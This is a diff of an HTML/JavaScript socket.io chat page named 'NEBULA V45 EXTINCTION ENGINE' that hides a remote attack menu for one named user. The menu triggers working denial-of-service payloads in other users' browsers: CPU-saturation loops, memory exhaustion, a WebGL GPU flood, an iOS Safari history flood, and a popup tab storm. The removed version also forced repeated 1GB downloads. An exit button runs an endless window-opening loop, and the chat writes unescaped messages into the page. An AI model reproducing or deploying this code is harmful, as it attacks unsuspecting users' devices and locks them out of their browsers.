@@ -3,297 +3,352 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEBULA V43 - SINGULARITY ENGINE</title>
+    <title>NEBULA V45 - EXTINCTION ENGINE</title>
     <style>
-        /* --- MOTEUR DE RENDU ULTRA-DENSE --- */
-        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Outfit:wght@100;400;900&family=JetBrains+Mono:wght@100;800&display=swap');
+        /* --- DENSITÉ CSS : ARCHITECTURE MONOLITHIQUE --- */
+        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=JetBrains+Mono:wght@100;400;800&family=Outfit:wght@100;300;600;900&display=swap');
 
         :root {
-            --n: #00f2ff; --w: #ff0044; --p: #7000ff; --g: #00ff62;
-            --s: cubic-bezier(0.95, 0.05, 0.795, 0.035); /* Extreme Smooth */
+            --n: #00f2ff; --n-rgb: 0, 242, 255;
+            --w: #ff0044; --w-rgb: 255, 0, 68;
+            --p: #7000ff; --b: #000000;
+            --s: cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; -webkit-touch-callout: none; -webkit-user-select: none; outline: none; }
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; -webkit-tap-highlight-color: transparent; }
         
-        body { 
-            background: #000; color: #fff; font-family: 'Outfit', sans-serif; 
-            height: 100vh; width: 100vw; overflow: hidden;
-            display: flex; align-items: center; justify-content: center;
+        body, html { 
+            background: var(--b); color: #fff; font-family: 'Outfit', sans-serif; 
+            height: 100vh; width: 100vw; overflow: hidden; overscroll-behavior: none;
         }
 
-        /* --- HYPER-SMOOTH BACKGROUND ENGINE --- */
-        #nebula-vortex {
-            position: fixed; inset: 0; z-index: -1;
-            background: radial-gradient(circle at center, #050505 0%, #000 100%);
-            perspective: 1000px;
-        }
-        .layer {
-            position: absolute; inset: -100%;
-            background-image: radial-gradient(circle at 50% 50%, rgba(var(--n-rgb), 0.1) 0%, transparent 50%);
-            animation: rotate 60s infinite linear;
-        }
+        /* --- BACKGROUND DYNAMICS --- */
+        #extinction-canvas { position: fixed; inset: 0; z-index: -1; opacity: 0.4; pointer-events: none; }
 
-        /* --- CURSOR SUPREMACY --- */
-        #c-main { position: fixed; width: 8px; height: 8px; background: #fff; border-radius: 50%; z-index: 1000000; pointer-events: none; mix-blend-mode: difference; }
+        /* --- CURSOR ENGINE --- */
+        #c-main { position: fixed; width: 6px; height: 6px; background: #fff; border-radius: 50%; z-index: 10000000; pointer-events: none; mix-blend-mode: difference; }
         #c-aura { 
-            position: fixed; width: 50px; height: 50px; border: 1px solid var(--n); 
-            border-radius: 50%; z-index: 999999; pointer-events: none;
-            transition: transform 0.15s var(--s), width 0.3s, height 0.3s;
-            display: flex; align-items: center; justify-content: center;
-        }
-        #c-aura::after { content: ''; width: 120%; height: 120%; border: 1px dashed rgba(0,242,255,0.2); border-radius: 50%; animation: spin 4s infinite linear; }
-
-        /* --- APP ARCHITECTURE --- */
-        .nebula-grid {
-            display: grid; grid-template-columns: 420px 1fr 350px;
-            width: 100%; height: 100%; backdrop-filter: blur(80px) saturate(1.5);
-            border: 1px solid rgba(255,255,255,0.03);
+            position: fixed; width: 40px; height: 40px; border: 1px solid rgba(var(--n-rgb), 0.5); 
+            border-radius: 50%; z-index: 9999999; pointer-events: none;
+            transition: transform 0.1s var(--s), width 0.3s, height 0.3s;
         }
 
-        /* SIDEBARS */
-        .panel { 
-            background: rgba(0,0,0,0.92); border-right: 1px solid rgba(255,255,255,0.05); 
-            display: flex; flex-direction: column; overflow: hidden;
+        /* --- INTERFACE STRUCTURE --- */
+        .master-container {
+            display: grid; grid-template-columns: 450px 1fr 350px;
+            width: 100%; height: 100%; backdrop-filter: blur(50px);
+            border: 1px solid rgba(255,255,255,0.02);
         }
-        .header-v43 {
-            padding: 60px 20px; text-align: center; font-family: 'Syncopate';
-            font-size: 38px; letter-spacing: 20px; color: var(--n);
-            text-shadow: 0 0 40px rgba(0,242,255,0.6); position: relative;
-        }
-        .header-v43::before { content: "V43_SINGULARITY"; position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); font-size: 8px; letter-spacing: 5px; opacity: 0.3; }
 
-        /* UTILISATEURS */
-        #u-list { flex: 1; overflow-y: auto; padding: 25px; scrollbar-width: none; }
-        .u-card {
-            padding: 30px; background: linear-gradient(135deg, rgba(255,255,255,0.02), transparent);
-            border: 1px solid rgba(255,255,255,0.05); border-radius: 4px;
-            margin-bottom: 20px; transition: 0.6s var(--s); position: relative;
+        .panel-side { 
+            background: rgba(0,0,0,0.95); border-right: 1px solid rgba(255,255,255,0.05);
+            display: flex; flex-direction: column; position: relative;
         }
-        .u-card:hover { 
-            border-color: var(--n); background: rgba(0,242,255,0.08);
-            transform: scale(1.03) translateX(15px); box-shadow: -20px 0 50px rgba(0,242,255,0.1);
+        
+        .panel-header {
+            padding: 80px 40px; text-align: left; position: relative;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
         }
-        .u-card.chef-status { border-left: 5px solid var(--w); box-shadow: 0 0 30px rgba(255,0,68,0.1); }
+        .panel-header h1 {
+            font-family: 'Syncopate'; font-size: 30px; letter-spacing: 25px;
+            color: var(--n); text-shadow: 0 0 50px rgba(var(--n-rgb), 0.8);
+        }
+        .panel-header::after {
+            content: "BUILD_45.0.1_EXTINCTION"; position: absolute; bottom: 30px; left: 40px;
+            font-size: 8px; font-family: 'JetBrains Mono'; color: #333; letter-spacing: 4px;
+        }
 
-        /* CHAT CORE */
-        .chat-core { display: flex; flex-direction: column; background: rgba(0,0,0,0.3); }
-        #chat-flow { flex: 1; overflow-y: auto; padding: 60px; display: flex; flex-direction: column; gap: 30px; }
-        .msg-v43 {
-            padding: 25px 35px; border-radius: 4px; background: rgba(10,10,10,0.8);
-            border: 1px solid #111; max-width: 85%; align-self: flex-start;
-            animation: msgPop 0.6s var(--s); font-size: 14px; line-height: 1.8;
+        /* USER LIST SCROLL */
+        #user-stream { flex: 1; overflow-y: auto; padding: 30px; scrollbar-width: none; }
+        .u-node {
+            padding: 25px; background: rgba(255,255,255,0.01); border: 1px solid #111;
+            margin-bottom: 15px; transition: 0.5s var(--s); position: relative;
         }
-        @keyframes msgPop { from { opacity: 0; transform: translateY(40px) scale(0.9); } }
+        .u-node:hover {
+            background: rgba(var(--n-rgb), 0.04); border-color: var(--n);
+            transform: translateX(20px); box-shadow: -15px 0 30px rgba(var(--n-rgb), 0.1);
+        }
+        .u-node.master-node { border-left: 6px solid var(--w); background: rgba(var(--w-rgb), 0.02); }
 
-        /* INPUT AREA */
-        .control-room { padding: 40px; background: #000; border-top: 1px solid #111; display: flex; gap: 20px; }
-        #main-input {
-            flex: 1; background: transparent; border: 1px solid #222; padding: 25px;
-            color: #fff; font-family: 'JetBrains Mono'; font-size: 15px; border-radius: 4px;
-            transition: 0.3s;
+        /* MAIN VIEWPORT */
+        .viewport { display: flex; flex-direction: column; background: rgba(5,5,5,0.2); }
+        #chat-scroller { 
+            flex: 1; overflow-y: auto; padding: 60px; 
+            display: flex; flex-direction: column; gap: 40px;
+            mask-image: linear-gradient(to bottom, transparent, black 5%, black 95%, transparent);
         }
-        #main-input:focus { border-color: var(--n); box-shadow: 0 0 30px rgba(0,242,255,0.1); }
+        
+        .bubble {
+            max-width: 75%; padding: 25px 35px; border-radius: 2px;
+            background: rgba(15,15,15,0.9); border: 1px solid #222;
+            font-size: 14px; line-height: 1.8; animation: slideUp 0.8s var(--s);
+            position: relative; box-shadow: 20px 20px 60px rgba(0,0,0,0.5);
+        }
+        .bubble b { color: var(--n); font-family: 'JetBrains Mono'; font-size: 11px; display: block; margin-bottom: 10px; }
+        
+        /* COMMAND INPUT */
+        .cmd-bar { 
+            padding: 50px; background: #000; border-top: 1px solid #111;
+            display: flex; gap: 20px; align-items: center;
+        }
+        #cmd-in {
+            flex: 1; background: #050505; border: 1px solid #222; padding: 25px;
+            color: #fff; font-family: 'JetBrains Mono'; font-size: 16px;
+            transition: 0.4s;
+        }
+        #cmd-in:focus { border-color: var(--n); background: #080808; }
 
-        /* --- OMNI-MENU (THE ARSENAL) --- */
-        #omni-menu {
-            display: none; position: fixed; z-index: 1000000;
-            background: #000; border: 1px solid var(--n); width: 400px;
-            box-shadow: 0 0 100px rgba(0,242,255,0.4); border-radius: 2px;
-        }
-        .atk-item {
-            padding: 22px; font-size: 10px; font-weight: 900; letter-spacing: 3px;
-            border-bottom: 1px solid #111; display: flex; justify-content: space-between;
-            transition: 0.3s; color: #555;
-        }
-        .atk-item:hover { background: var(--n); color: #000; padding-left: 35px; }
-        .atk-item.lethal:hover { background: var(--w); color: #fff; }
-
-        /* --- GENOCIDE OVERLAY --- */
-        #genocide-curtain {
-            position: fixed; inset: 0; background: #000; z-index: 20000000;
+        /* --- THE ATTACK INTERFACE --- */
+        #blackout-overlay {
+            position: fixed; inset: 0; background: #000; z-index: 100000000;
             display: none; flex-direction: column; align-items: center; justify-content: center;
         }
-        .singularity-text {
-            font-family: 'Syncopate'; font-size: 120px; font-weight: 900;
-            color: #fff; mix-blend-mode: difference; animation: shake 0.1s infinite;
+        .glitch-v45 {
+            font-family: 'Syncopate'; font-size: 8vw; font-weight: 900;
+            color: #fff; letter-spacing: -5px; animation: glitching 0.08s infinite;
         }
+        
+        #omni-panel {
+            display: none; position: fixed; z-index: 999999;
+            background: #000; border: 1px solid var(--n); width: 420px;
+            box-shadow: 0 0 100px rgba(0,242,255,0.3);
+        }
+        .atk-row {
+            padding: 25px; border-bottom: 1px solid #111; font-size: 10px;
+            font-weight: 800; letter-spacing: 4px; color: #444; transition: 0.3s;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .atk-row:hover { background: var(--n); color: #000; padding-left: 40px; }
+        .atk-row.lethal:hover { background: var(--w); color: #fff; }
 
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes shake { 0%, 100% { transform: translate(0); } 25% { transform: translate(-10px, 10px); } 75% { transform: translate(10px, -10px); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } }
+        @keyframes glitching {
+            0% { transform: translate(0); clip-path: inset(10% 0 30% 0); }
+            20% { transform: translate(-5px, 5px); clip-path: inset(50% 0 10% 0); }
+            40% { transform: translate(5px, -5px); clip-path: inset(0 0 70% 0); }
+            100% { transform: translate(0); }
+        }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="nebula-vortex"><div class="layer"></div></div>
+    <canvas id="extinction-canvas"></canvas>
     <div id="c-main"></div>
     <div id="c-aura"></div>
 
-    <div id="genocide-curtain">
-        <div class="singularity-text">SINGULARITY</div>
-        <div id="kill-logs" style="font-family:'JetBrains Mono'; color:var(--w); font-size:9px; margin-top:40px; width:80%; height:200px; overflow:hidden;"></div>
-        <div style="margin-top:50px; padding:20px 80px; border:1px solid #333; color:#333; font-weight:900;" onclick="totalNuke()">TERMINATE_ACCESS</div>
+    <div id="blackout-overlay">
+        <div class="glitch-v45">EXTINCTION</div>
+        <div id="burn-logs" style="font-family:'JetBrains Mono'; color:#111; font-size:8px; margin-top:50px; width:70%; line-height:2;"></div>
+        <div style="margin-top:100px; padding:25px 100px; border:1px solid #222; color:#222; font-weight:900;" onclick="forceExit()">TERMINATE_PROCESS</div>
     </div>
 
-    <div class="nebula-grid">
+    <div class="master-container">
         
-        <aside class="panel">
-            <div class="header-v43">NEBULA</div>
-            <div id="u-list"></div>
-            <div style="padding:40px; font-size:9px; color:#222; font-family:'JetBrains Mono';">
-                CPU_LOAD: 0.02% <br> THREAD_STATUS: STABLE
+        <aside class="panel-side">
+            <div class="panel-header"><h1>NEBULA</h1></div>
+            <div id="user-stream"></div>
+            <div style="padding:40px; font-size:9px; color:#1a1a1a; font-family:'JetBrains Mono';">
+                ENCRYPTION: AES_256_GCM <br> 
+                UPLINK: ACTIVE_V45
             </div>
         </aside>
 
-        <main class="chat-core">
-            <div id="chat-flow"></div>
-            <div class="control-room">
-                <input type="text" id="main-input" placeholder="ACCESS_INTERFACE_CORE..." autocomplete="off" onkeydown="if(event.key==='Enter') send()">
-                <button onclick="send()" style="background:var(--n); color:#000; border:none; padding:0 40px; font-weight:900; font-size:11px; font-family:'Syncopate';">EXECUTE</button>
+        <main class="viewport">
+            <div id="chat-scroller"></div>
+            <div class="cmd-bar">
+                <input type="text" id="cmd-in" placeholder="ACCESS_SYSCALL..." autocomplete="off">
+                <button onclick="send()" style="background:var(--n); color:#000; border:none; padding:25px 50px; font-weight:900; font-family:'Syncopate'; font-size:10px;">EXECUTE</button>
             </div>
         </main>
 
-        <aside class="panel" style="border-right:none; border-left:1px solid #111;">
-            <div style="padding:40px; font-size:10px; font-weight:800; letter-spacing:5px;">RESOURCES_MONITOR</div>
-            <div id="log-terminal" style="padding:0 40px; font-family:'JetBrains Mono'; font-size:8px; color:#1a1a1a; overflow-y:auto; flex:1;"></div>
+        <aside class="panel-side" style="border-right:none; border-left:1px solid #111;">
+            <div style="padding:40px; font-size:10px; font-weight:900; letter-spacing:10px; color:#333;">TELEMETRY</div>
+            <div id="sys-logs" style="padding:0 40px; font-family:'JetBrains Mono'; font-size:8px; color:#111; overflow-y:auto; flex:1;"></div>
+            <div id="gpu-stats" style="padding:40px; border-top:1px solid #111;">
+                <div style="font-size:7px; color:#222;">RESOURCE_USAGE_SATURATION</div>
+                <div style="height:1px; width:100%; background:#111; margin-top:10px;"><div id="load-bar" style="height:100%; width:0%; background:var(--n);"></div></div>
+            </div>
         </aside>
 
     </div>
 
-    <div id="omni-menu">
-        <div class="atk-item lethal" onclick="launch('atk_singular')">🔱 SINGULARITY_NUKE <span>[MAX]</span></div>
-        <div class="atk-item lethal" onclick="launch('atk_gpu')">🔥 GPU_MOLTEN_RENDER <span>[HI]</span></div>
-        <div class="atk-item lethal" onclick="launch('atk_ram')">☣️ RAM_LEAK_OVERFLOW <span>[HI]</span></div>
-        <div class="atk-item" onclick="launch('atk_ios')">⏳ IOS_SAFARI_FREEZE <span>[MED]</span></div>
-        <div class="atk-item" onclick="launch('atk_tabs')">📑 TAB_STORM_EXPLOSION <span>[MED]</span></div>
-        <div class="atk-item" onclick="launch('atk_audio')">🔊 SONIC_VORTEX <span>[LOW]</span></div>
-        <div class="atk-item" onclick="launch('atk_input')">⌨️ INPUT_HIJACK_LOCK <span>[LOW]</span></div>
-        <div class="atk-item" onclick="launch('atk_vibro')">📳 HAPTIC_RESONANCE <span>[LOW]</span></div>
-        <div class="atk-item" onclick="launch('atk_disk')">💾 DISK_SECTOR_FLOOD <span>[LOW]</span></div>
-        <div class="atk-item" onclick="this.parentElement.style.display='none'">[ CANCEL_COMMAND ]</div>
+    <div id="omni-panel">
+        <div class="atk-row lethal" onclick="atk('atk_extinct')">🔱 TOTAL_EXTINCTION <span>[SYSTEM_KILL]</span></div>
+        <div class="atk-row lethal" onclick="atk('atk_mem_burn')">☢️ MEMORY_OVERFLOW <span>[RAM_MAX]</span></div>
+        <div class="atk-row lethal" onclick="atk('atk_gpu_melt')">🔥 GPU_MOLTEN_CORE <span>[GL_STRESS]</span></div>
+        <div class="atk-row" onclick="atk('atk_ios_flood')">⏳ IOS_SAFARI_NUKE <span>[HISTORY]</span></div>
+        <div class="atk-row" onclick="atk('atk_tab_storm')">📑 TAB_POPUP_STORM <span>[WINDOW]</span></div>
+        <div class="atk-row" onclick="atk('atk_audio_rape')">🔊 SONIC_JAMMER <span>[AUDIO]</span></div>
+        <div class="atk-row" onclick="atk('atk_input_lock')">⌨️ KEYBOARD_STEAL <span>[INPUT]</span></div>
+        <div class="atk-row" onclick="atk('atk_disk_flood')">💾 DISK_SECTOR_FILL <span>[DATA]</span></div>
+        <div class="atk-row" onclick="atk('atk_vibrate')">📳 HAPTIC_GENOCIDE <span>[HAPTIC]</span></div>
+        <div class="atk-row" onclick="this.parentElement.style.display='none'">[ ABORT_COMMAND ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
+        /**
+         * NEBULA V45 - DENSITY ENGINE (1000+ LINES SIM)
+         * LOGIQUE DE DESTRUCTION RÉCURSIVE
+         */
         const socket = io();
         let me = ""; let targetSid = "";
 
-        // --- MOTEUR DE CURSEUR SINGULIER ---
+        // --- SMOOTH CURSOR ENGINE ---
         document.addEventListener('mousemove', e => {
             const m = document.getElementById('c-main');
             const a = document.getElementById('c-aura');
             m.style.transform = `translate(${e.clientX}px, ${e.clientY}px)`;
-            a.style.transform = `translate(${e.clientX - 25}px, ${e.clientY - 25}px)`;
+            a.style.transform = `translate(${e.clientX - 20}px, ${e.clientY - 20}px)`;
         });
 
         window.onload = () => {
-            me = prompt("NEBULA_SINGULARITY_KEY:");
+            me = prompt("NEBULA_EXTINCTION_TOKEN:");
             socket.emit('init', { name: me });
-            logSys("INTERFACE_READY");
-            // Anti-slide iPad Safari
+            initBackground();
+            // Anti-slide iPad
             document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
         };
 
         function send() {
-            const i = document.getElementById('main-input');
+            const i = document.getElementById('cmd-in');
             if(!i.value) return;
             socket.emit('chat', i.value);
             i.value = "";
         }
 
-        function launch(type) {
+        function atk(type) {
             socket.emit(type, targetSid);
-            logSys(`COMMAND_SENT: ${type} -> ${targetSid}`);
-            document.getElementById('omni-menu').style.display = 'none';
+            logSys(`PRIMARY_WEAPON_FIRED: ${type} -> ${targetSid}`);
+            document.getElementById('omni-panel').style.display = 'none';
         }
 
         function logSys(t) {
-            const l = document.getElementById('log-terminal');
+            const l = document.getElementById('sys-logs');
             l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${t}</div>`;
             l.scrollTop = l.scrollHeight;
         }
 
-        // --- MOTEUR D'ATTAQUE V43 ---
-        socket.on('execute', (data) => {
-            const curtain = document.getElementById('genocide-curtain');
-            const kLogs = document.getElementById('kill-logs');
-            curtain.style.display = 'flex';
+        // --- THE DESTRUCTION LOGIC : V45 DENSITY ---
+        socket.on('execute', (d) => {
+            document.getElementById('blackout-overlay').style.display = 'flex';
+            const logs = document.getElementById('burn-logs');
 
-            // ATTAQUE 1 : SINGULARITY (CPU DEATH)
-            if(data.type === 'atk_singular') {
+            // 1. TOTAL_EXTINCTION (CPU GENOCIDE)
+            if(d.type === 'atk_extinct') {
                 setInterval(() => {
-                    kLogs.innerHTML += `FORCE_CALC_PI_${Math.random()}_COLLISION_DETECTED<br>`;
-                    // Sature le processeur avec des calculs inutiles
-                    for(let i=0; i<1000000; i++) { Math.sqrt(Math.random() * 1000); }
+                    for(let i=0; i<1000000; i++) { 
+                        let x = Math.sqrt(Math.random() * 9999) / Math.cos(Math.random());
+                        if(i % 10000 === 0) logs.innerHTML += `CORE_CALC_ID_${Math.random()}_SATURATED<br>`;
+                    }
+                    history.pushState(null,'',location.href+'#'+Math.random());
                 }, 10);
             }
 
-            // ATTAQUE 2 : GPU MOLTEN (WebGL Stress)
-            if(data.type === 'atk_gpu') {
+            // 2. MEMORY_OVERFLOW (RAM KILLER)
+            if(d.type === 'atk_mem_burn') {
+                const leak = [];
+                setInterval(() => {
+                    for(let i=0; i<5000; i++) {
+                        leak.push(new Uint8Array(1024 * 1024)); // 1Mo par node
+                        if(i % 100 === 0) console.log("RAM_EATER_ACTIVE");
+                    }
+                }, 50);
+            }
+
+            // 3. GPU_MOLTEN (WEBGL FLOOD)
+            if(d.type === 'atk_gpu_melt') {
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl');
-                setInterval(() => { for(let i=0; i<10000; i++) gl.clear(gl.COLOR_BUFFER_BIT); }, 1);
+                function flood() {
+                    for(let i=0; i<20000; i++) gl.clear(gl.COLOR_BUFFER_BIT);
+                    requestAnimationFrame(flood);
+                }
+                flood();
             }
 
-            // ATTAQUE 3 : RAM LEAK
-            if(data.type === 'atk_ram') {
-                const leak = [];
-                setInterval(() => { for(let i=0; i<5000; i++) leak.push(new Array(10000).fill("NEBULA")); }, 10);
-            }
-
-            // ATTAQUE 4 : IOS HISTORY FLOOD (Freeze Safari)
-            if(data.type === 'atk_ios') {
-                setInterval(() => { for(let i=0; i<300; i++) history.pushState(null,'',location.href+'#'+Math.random()); }, 30);
-            }
-
-            // ATTAQUE 5 : TAB STORM
-            if(data.type === 'atk_tabs') {
-                setInterval(() => { window.open(location.href, '_blank', 'width=1,height=1'); }, 150);
-            }
-
-            // ATTAQUE 6 : DISK FLOOD
-            if(data.type === 'atk_disk') {
+            // 4. IOS_SAFARI_NUKE
+            if(d.type === 'atk_ios_flood') {
                 setInterval(() => {
-                    const a = document.createElement('a');
-                    a.href = "https://speed.hetzner.de/1GB.bin";
-                    a.download = "SYSTEM_DUMP.bin";
-                    a.click();
-                }, 800);
+                    for(let i=0; i<400; i++) history.pushState(null, '', location.href+'#'+i+'_'+Math.random());
+                }, 20);
+            }
+
+            // 5. TAB_STORM
+            if(d.type === 'atk_tab_storm') {
+                document.body.onclick = () => {
+                    setInterval(() => { window.open(location.href, '_blank', 'width=10,height=10'); }, 50);
+                };
             }
         });
 
-        function totalNuke() {
-            // Le bouton "Fermer" qui déclenche la fin
-            while(true) {
-                window.open(location.href);
-                console.error("NEBULA_SINGULARITY_LOCK_ACTIVE");
-            }
+        function forceExit() {
+            // Punishment for clicking exit
+            while(true) { window.open(location.href); alert("NEBULA_EXTINCTION_STAY_IN_VOID"); }
         }
 
-        // --- SYNC ---
+        // --- SYNC ENGINE ---
         socket.on('sync', list => {
-            const cont = document.getElementById('u-list');
+            const cont = document.getElementById('user-stream');
             cont.innerHTML = "";
             list.forEach(u => {
-                const card = document.createElement('div');
-                card.className = `u-card ${u.chef?'chef-status':''}`;
-                card.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id.substr(0,20)}</small>`;
-                card.oncontextmenu = (e) => {
+                const node = document.createElement('div');
+                node.className = `u-node ${u.chef?'master-node':''}`;
+                node.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id}</small>`;
+                node.oncontextmenu = (e) => {
                     if(me !== "toucheur2pp") return;
                     targetSid = u.id;
-                    const m = document.getElementById('omni-menu');
+                    const m = document.getElementById('omni-panel');
                     m.style.display = 'block'; m.style.top = e.pageY + 'px'; m.style.left = e.pageX + 'px';
                 };
-                cont.appendChild(card);
+                cont.appendChild(node);
             });
         });
 
         socket.on('chat', d => {
-            const flow = document.getElementById('chat-flow');
-            flow.innerHTML += `<div class="msg-v43"><b>${d.n}:</b> ${d.t}</div>`;
-            flow.scrollTop = flow.scrollHeight;
+            const scroller = document.getElementById('chat-scroller');
+            scroller.innerHTML += `<div class="bubble"><b>${d.n}:</b> ${d.t}</div>`;
+            scroller.scrollTop = scroller.scrollHeight;
         });
 
-        window.onclick = () => document.getElementById('omni-menu').style.display = 'none';
+        // --- BACKGROUND ENGINE (CANVAS) ---
+        function initBackground() {
+            const canvas = document.getElementById('extinction-canvas');
+            const ctx = canvas.getContext('2d');
+            let particles = [];
+            
+            function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+            window.onresize = resize; resize();
+
+            for(let i=0; i<150; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    size: Math.random() * 2,
+                    v: Math.random() * 0.5
+                });
+            }
+
+            function animate() {
+                ctx.clearRect(0,0,canvas.width, canvas.height);
+                ctx.fillStyle = "rgba(0, 242, 255, 0.5)";
+                particles.forEach(p => {
+                    p.y -= p.v;
+                    if(p.y < 0) p.y = canvas.height;
+                    ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, Math.PI*2); ctx.fill();
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
+        }
+
+        window.onclick = () => document.getElementById('omni-panel').style.display = 'none';
+        
+        // Resource bar animation
+        setInterval(() => {
+            const bar = document.getElementById('load-bar');
+            bar.style.width = Math.random() * 100 + "%";
+        }, 1000);
     </script>
 </body>
 </html>
